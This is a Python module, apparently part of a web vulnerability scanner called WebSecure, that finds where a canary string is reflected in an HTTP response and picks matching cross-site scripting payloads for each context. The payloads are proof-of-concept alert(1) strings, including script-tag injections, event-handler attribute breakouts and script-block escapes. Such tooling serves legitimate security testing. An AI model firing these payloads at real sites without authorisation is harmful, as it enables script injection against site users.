# -*- coding: utf-8 -*-
"""
Adaptive Reflection Analyzer for WebSecure (Level 3)

Bu modül, bir input'un HTTP yanıtında nereye yansıdığını (HTML Body, Attribute, Script vb.) analiz eder.
Bu sayede "context-aware" payload seçimi yapılabilir.
"""

from __future__ import annotations
import re
from enum import Enum, auto
from typing import List, Optional, Tuple
from dataclasses import dataclass


class ReflectionType(Enum):
    NONE = auto()                   # Yansıma yok
    HTML_TEXT = auto()              # <div>INPUT</div>
    HTML_ATTR_DOUBLE = auto()       # <div class="INPUT">
    HTML_ATTR_SINGLE = auto()       # <div class='INPUT'>
    HTML_ATTR_UNQUOTED = auto()     # <div class=INPUT>
    SCRIPT_BLOCK = auto()           # <script>var x = "INPUT";</script>
    SCRIPT_QUOTED = auto()          # <script>var x = "INPUT";</script>
    COMMENT = auto()                # <!-- INPUT -->


@dataclass
class ReflectionPoints:
    canary: str
    contexts: List[ReflectionType]
    raw_response: str = ""


# =============================================================================
# REFLECTION ANALYSIS LOGIC
# =============================================================================

def analyze_reflection(response_text: str, canary: str) -> ReflectionPoints:
    """
    Verilen canary değerinin response içindeki konumlarını analiz eder.
    Basit regex-tabanlı parser kullanır (hız için).
    """
    if not response_text or canary not in response_text:
        return ReflectionPoints(canary, [ReflectionType.NONE], response_text)

    contexts = []
    
    # 1. Script Block Detection
    # Basitçe <script> tagleri arasını bulup orada var mı bakarız
    script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', response_text, re.DOTALL | re.IGNORECASE)
    in_script = False
    for block in script_blocks:
        if canary in block:
            in_script = True
            # Script içinde quote durumuna bak (basit heuristik)
            # "canary" veya 'canary'
            if f'"{canary}"' in block or f"'{canary}'" in block:
                contexts.append(ReflectionType.SCRIPT_QUOTED)
            else:
                contexts.append(ReflectionType.SCRIPT_BLOCK)
            break # Genelde 1 script yansıması yeterlidr
            
    if not in_script:
        # 2. Attribute Detection
        # class="canary" gibi
        # (["'])[^"']*?canary[^"']*?\1
        
        # Double Quote
        if re.search(f'="[^"]*{canary}[^"]*"', response_text):
            contexts.append(ReflectionType.HTML_ATTR_DOUBLE)
        # Single Quote
        elif re.search(f"='[^']*{canary}[^']*'", response_text):
            contexts.append(ReflectionType.HTML_ATTR_SINGLE)
        # Unquoted (zor ama deneyelim) - <div id=canary>
        elif re.search(f'=[^"\'\s>]*{canary}[^"\'\s>]*', response_text):
             contexts.append(ReflectionType.HTML_ATTR_UNQUOTED)
        
        # 3. Comment Detection
        elif re.search(f'<!--.*{canary}.*-->', response_text, re.DOTALL):
            contexts.append(ReflectionType.COMMENT)
            
        # 4. Fallback: HTML Text
        else:
            contexts.append(ReflectionType.HTML_TEXT)

    return ReflectionPoints(canary, list(set(contexts)), response_text)


# =============================================================================
# PAYLOAD SELECTION
# =============================================================================

def get_payloads_for_context(ctx: ReflectionType) -> List[str]:
    """
    Bulunan bağlama göre en etkili (Sniper) payload'ları döndürür.
    """
    if ctx == ReflectionType.HTML_TEXT:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
    elif ctx == ReflectionType.HTML_ATTR_DOUBLE:
        return [
            '"><script>alert(1)</script>',
            '" onmouseover="alert(1)',
            '" autofocus onfocus="alert(1)'
        ]
    elif ctx == ReflectionType.HTML_ATTR_SINGLE:
        return [
            "'><script>alert(1)</script>",
            "' onmouseover='alert(1)",
            "' autofocus onfocus='alert(1)"
        ]
    elif ctx == ReflectionType.SCRIPT_BLOCK:
        return [
            ";alert(1);//",
            "alert(1);",
            "</script><script>alert(1)</script>" # Break out
        ]
    elif ctx == ReflectionType.SCRIPT_QUOTED:
        return [
            "';alert(1);//",
            '";alert(1);//',
            "\\';alert(1);//" # Escape escape?
        ]
    elif ctx == ReflectionType.COMMENT:
        return [
            "--> <script>alert(1)</script>"
        ]
        
    return [] # None
